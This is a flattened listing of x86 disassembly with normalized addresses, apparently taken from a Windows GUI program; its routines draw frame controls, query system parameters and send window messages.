push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477552
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_4810d8
mov eax [ ebx + 0x210 ]
call sub_47d6b0
mov [ eax + 0x24 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477559
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
cmp [ ebx + 0x318 ] 0x0
je r-xdata
xor edi edi
mov eax [ ebx + 0x318 ]
mov edx [ eax + 0x214 ]
cmp [ edx + 0x88 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edi eax
mov eax [ edi + 0x210 ]
call sub_4193b8
mov edx eax
mov eax [ edi + 0x214 ]
mov eax [ eax + 0x88 ]
call sub_4196e8
mov edi eax
mov eax esi
call sub_47d6b0
call sub_419748
test eax eax
jle r-xdata
mov eax esi
call sub_47d6b0
call sub_47deac
mov [ ebx + 0x31c ] eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x31c ]
call sub_47ef98
mov eax edi
call sub_47d6b0
call sub_419748
dec eax
push eax
mov eax edi
call sub_47d6b0
push eax
mov eax [ ebx + 0x31c ]
call sub_47d6b0
pop edx
pop ecx
call sub_4772b8
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_4840c8
mov eax [ eax + 0x210 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47d6b0
call sub_419748
sub eax 0x2
push eax
mov eax [ ebp - 0x4 ]
call sub_47d6b0
push eax
mov eax [ ebx + 0x31c ]
call sub_47d6b0
pop edx
pop ecx
call sub_4772b8
mov eax edi
call sub_47d6b0
call sub_419748
test eax eax
jle r-xdata
mov eax esi
call sub_47d6b0
call sub_47728c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_459318
mov edi eax
mov [ ebx + 0x320 ] edi
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4594c8
mov eax [ ebx + 0x31c ]
call sub_47d6b0
call sub_419748
test eax eax
jle r-xdata
mov eax esi
call sub_47d6b0
call sub_47deac
mov edi eax
mov [ ebx + 0x324 ] edi
mov edx [ ebx + 0x320 ]
mov eax edi
call sub_47ee8c
or edx 0xffffffff
mov eax edi
call sub_47f23c
mov eax esi
call sub_47d6b0
call sub_47728c
sub_477560
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_484674
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_47759c
push ebx
add esp 0xfffffff0
mov ebx eax
xor eax eax
mov al [ ebx + 0x181 ]
mov ax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x188 ]
or ax [ edx * 2 + rw-data ]
cmp [ ebx + 0x182 ] 0x2
sete dl
and edx 0x7f
or ax [ edx * 2 + rw-data ]
movzx eax ax
push eax
push 0x1
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawFrameControl
add esp 0x10
pop ebx
retn
sub_477604
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_473760
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov dl [ r-xdata ]
mov eax esi
call sub_42f204
mov dl 0x1
mov eax esi
call sub_42f22c
mov dl 0x2
mov eax esi
call sub_42f240
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x100a
call SystemParametersInfoA
mov dl 0x1
mov eax esi
call sub_44bd60
cmp [ ebp - 0x4 ] 0x1
sbb edx edx
inc edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov [ esi + 0x218 ] 0x0
mov edx 0x1
mov eax esi
call sub_48189c
mov edx 0x1d
mov eax esi
call sub_44c02c
xor edx edx
mov eax esi
call sub_4532ec
mov [ esi + 0x30e ] 0x1
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] sub_478320
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0xb020
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4776f4
push ebx
push esi
add esp 0xfffffff8
call sub_403674
mov ebx edx
mov esi eax
mov [ esp + 0x4 ] esi
mov [ esp ] sub_478320
mov eax esp
push eax
push 0x1
push 0xb020
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4737ec
test bl bl
jle r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_477758
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x227 ]
mov edx eax
sub dl 0x2
jb r-xdata
mov dx [ esi + 0x4 ]
sub dx 0x25
je r-xdata
sub dl 0x2
jb r-xdata
test al al
setne dl
mov eax ebx
call sub_474f74
jmp r-xdata
dec dx
je r-xdata
mov ax [ esi + 0x4 ]
sub ax 0x25
je r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4752ec
mov eax ebx
call sub_4747d4
test eax eax
je r-xdata
dec dx
je r-xdata
mov dl 0x1
mov eax ebx
call sub_474f74
sub ax 0x2
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
test al al
sete dl
mov eax ebx
call sub_474f74
jmp r-xdata
dec dx
je r-xdata
mov eax ebx
call sub_4747d4
test eax eax
je r-xdata
mov eax ebx
call sub_4747d4
call sub_47d670
test al al
je r-xdata
mov eax ebx
call sub_4747d4
call sub_47d670
test al al
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_4747d4
call sub_47d670
test al al
je r-xdata
mov eax ebx
call sub_4747d4
mov ecx [ eax + 0x40 ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14c ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x140 ]
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov [ esi + 0x4 ] 0x0
pop esi
pop ebx
retn
call sub_464204
test al 0x4
je r-xdata
mov eax ebx
call sub_4747d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4747d4
call sub_47d6b0
call sub_47deac
mov eax ebx
call sub_47b62c
sub_4778b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_473ce8
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov edx eax
mov eax edi
call sub_403458
mov edx 0x2
call sub_483acc
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4778e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4825bc
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x100
jne r-xdata
mov edx [ ebx + 0x4 ]
sub edx 0x1b
je r-xdata
cmp [ ebx + 0x4 ] 0x1b
jne r-xdata
add edx 0xfffffff6
sub edx 0x4
jae r-xdata
mov al 0x1
cmp [ esi + 0x296 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi + 0x224 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_477948
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_4744d8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x100a
call SystemParametersInfoA
cmp [ esp ] 0x0
jne r-xdata
pop edx
pop ebx
retn
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x138 ]
sub_47797c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2a4 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30c ] 0x1
xor eax eax
push ebp
push sub_477a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax ebx
call sub_466fb8
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
inc edi
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30c ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_47812c
inc esi
dec edi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov edx esi
mov eax ebx
call sub_467004
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_478088
jmp r-xdata
mov edx esi
mov eax ebx
call sub_467004
cmp [ eax + 0x22b ] 0x2
jne r-xdata
sub_477a3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45235c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
sub_477a64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474a20
mov eax [ esi + 0x4 ]
sub eax 0x201
je r-xdata
mov edx esi
mov eax ebx
call sub_4746e0
mov esi eax
test esi esi
je r-xdata
sub eax 0x3
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp ebx [ esi + 0x4 ]
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi + 0x18a ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_4034a4
jmp r-xdata
sub_477ac8
push esi
push edi
mov edi eax
mov eax edi
call sub_48252c
mov eax edi
mov si 0xffd0
call sub_4034a4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ edi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_477af8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
cmp bl al
je r-xdata
mov edx ebx
mov eax esi
call sub_4750a0
pop esi
pop ebx
retn
mov eax esi
call sub_473b98
sub_477b34
push ebx
mov ebx eax
mov eax ebx
call sub_47fc44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
xor dl 0x1
mov eax ebx
call sub_477b20
pop ebx
retn
sub_477b54
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47498c
mov esi eax
mov dl [ ebx + 0x30e ]
mov eax esi
call sub_476e08
mov eax esi
pop esi
pop ebx
retn
sub_477b74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_477c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx esi
mov eax edi
call sub_4757f0
cmp bl 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c08
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ esi + 0x16c ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x16c ]
call sub_47eb74
mov eax [ ebp - 0x4 ]
mov edx [ edi + 0x310 ]
call sub_404444
jne r-xdata
lea eax [ edi + 0x310 ]
call sub_404038
xor eax eax
mov [ edi + 0x324 ] eax
sub_477c10
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x310 ]
mov eax ebx
call sub_4808f4
test eax eax
je r-xdata
mov eax [ eax + 0x16c ]
mov [ ebx + 0x324 ] eax
sub_477c3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
call sub_458f80
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
mov edx ebx
call sub_458f6c
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
mov edx ebx
call sub_458f6c
cmp edi [ eax + 0xa0 ]
jne r-xdata
sub_477cb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477e93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477e9a
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x324 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47797c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x308 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x2a4 ]
mov eax edi
call sub_466fb8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458e38
mov edx [ ebp - 0x4 ]
mov [ edx + 0x308 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
call sub_47d6b0
call sub_47deac
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x320 ] ebx
mov eax ebx
mov edx r-xdata
call sub_47ef98
mov eax edi
call sub_466fb8
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x320
call sub_40d4f0
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x308 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_446228
mov ebx eax
mov [ ebx + 0xb0 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x308 ]
mov eax ebx
call sub_458d34
mov edx edi
mov eax ebx
call sub_4596a8
mov edx esi
mov eax edi
call sub_467004
mov edx eax
mov eax ebx
call sub_44620c
mov edx esi
mov eax edi
call sub_467004
lea edx [ ebp - 0x10 ]
call sub_44c874
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_4594c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
call sub_47d6b0
call sub_47deac
mov [ ebx + 0xa8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xac ] eax
mov edx ebx
mov eax [ ebx + 0xa8 ]
call sub_47ee8c
mov edx esi
mov eax edi
call sub_467004
lea edx [ ebp - 0xc ]
call sub_44c874
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4594c8
jmp r-xdata
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_459528
test esi esi
jne r-xdata
push ebp
mov edx esi
mov eax edi
call sub_467004
call sub_477c3c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
sub_477eb0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43741c
mov esi eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax esi
call sub_44c794
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_44bfe0
push 0x36
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44c008
push 0x37
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44c02c
mov [ esi + 0x188 ] bl
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_446228
mov edx eax
mov eax esi
call sub_44bbc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x227 ]
sub al 0x1
jb r-xdata
mov dl [ r-xdata ]
mov eax esi
call sub_44bba0
mov al [ esi + 0x188 ]
sub al 0x1
jb r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x48 ]
lea eax [ eax + eax * 2 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_44bfbc
jmp r-xdata
je r-xdata
mov al [ esi + 0x188 ]
sub al 0x1
jb r-xdata
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403458
mov dl [ esi + 0x188 ]
sub dl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x48 ]
add eax eax
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_44bfbc
jmp r-xdata
dec al
je r-xdata
mov edx [ esi + 0x48 ]
add edx edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_44bfbc
jmp r-xdata
je r-xdata
mov [ eax + 0xb0 ] 0x3
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
sub edx [ esi + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_44bfbc
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_44bfbc
jmp r-xdata
dec al
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov [ eax + 0xb0 ] 0x2
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_44bfbc
jmp r-xdata
mov [ eax + 0xb0 ] 0x1
jmp r-xdata
sub_478088
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x318 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x314 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_44620c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_44620c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x31c ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_44620c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
push ebp
xor eax eax
call sub_477eb0
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x314 ] eax
push ebp
mov al 0x1
call sub_477eb0
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x318 ] eax
push ebp
mov al 0x2
call sub_477eb0
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x31c ] eax
sub_478154
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov edi [ ebx + 0x314 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47ffb4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ esi + 0x8 ]
cmp eax [ edi + 0x40 ]
jle r-xdata
mov al [ ebx + 0x227 ]
sub al 0x1
jb r-xdata
mov eax [ edi + 0x40 ]
sub eax 0x2
mov [ esi + 0x8 ] eax
jmp r-xdata
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_44c214
mov eax [ ebp - 0x20 ]
add eax 0x2
mov [ esi ] eax
jmp r-xdata
sub_4781d8
push ebx
mov ebx eax
mov eax ebx
call sub_47fd60
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x310 ]
call sub_4042f8
test eax eax
jle r-xdata
mov eax ebx
call sub_477c10
sub_478204
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
cmp [ esi + 0x8 ] 0x20
je r-xdata
cmp [ esi + 0x8 ] 0x2d
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov ax [ esi + 0x8 ]
test ax ax
je r-xdata
cmp [ ebx + 0x28a ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_480800
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0x28a ] 0x0
jne r-xdata
mov eax ebx
call sub_480a00
mov edi eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x138 ]
test edi edi
je r-xdata
mov eax [ edi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov [ ebx + 0x28a ] 0x0
mov [ esi + 0xc ] 0x1
push 0x0
push 0x0
push 0xb410
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
mov eax [ edi + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_478320
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff5000
sub eax 0x2
jae r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ ebx + 0x296 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi ] 0xb001
sete dl
mov eax ebx
call sub_477b20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
sub_478370
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_477cb0
xor eax eax
push ebp
push sub_4783bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4751b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4783c4
mov eax [ ebp - 0x4 ]
add eax 0x308
call sub_40d4f0
mov eax [ ebp - 0x4 ]
add eax 0x320
call sub_40d4f0
retn
sub_4783c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_482618
mov eax [ r-xdata ]
not eax
and eax [ edi + 0x50 ]
mov [ edi + 0x50 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0xa
xor edx edx
mov eax 0x2
call sub_417298
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_483a6c
mov edx 0xa
mov eax edi
call sub_483acc
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
push 0xf
call GetSystemMetrics
mov [ edi + 0x1c4 ] eax
mov eax edi
test bl bl
je r-xdata
mov [ edi + 0x1ac ] esi
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_478470
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4826c0
test bl bl
jle r-xdata
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4784c0
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_47d670
test al al
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d6b0
call sub_47e30c
test eax eax
je r-xdata
mov esi [ ebx + 0x160 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ esi + 0x10 ]
call sub_424990
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x64 ]
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
push 0x3
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ esi + 0x10 ]
call sub_424988
mov edx eax
mov eax [ esi + 0x14 ]
call sub_424c70
cmp [ ebx + 0x18a ] 0x0
je r-xdata
sub edx 0x3
mov eax [ ebx + 0x48 ]
sub eax 0xb
call sub_41725c
lea ecx [ esp + 0x4 ]
mov dl 0x1
mov eax [ ebx + 0x160 ]
call sub_46ed34
adc edx 0x0
sub_4785a8
push ebx
mov ebx eax
mov eax ebx
call sub_4833fc
mov eax [ ebx + 0x16c ]
call sub_47d670
test al al
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
sub_478608
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
test [ ebx + 0x1a8 ] 0x2
je r-xdata
test [ ebx + 0x1a8 ] 0x8
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov esi [ esp + 0x4 ]
mov ecx esi
mov edx [ esp ]
mov eax [ ebx + 0x160 ]
call sub_42517c
mov ecx esi
mov edx [ esp + 0x8 ]
mov eax [ ebx + 0x160 ]
call sub_42511c
test [ ebx + 0x1a8 ] 0x4
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
call sub_47f734
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov esi [ esp + 0xc ]
dec esi
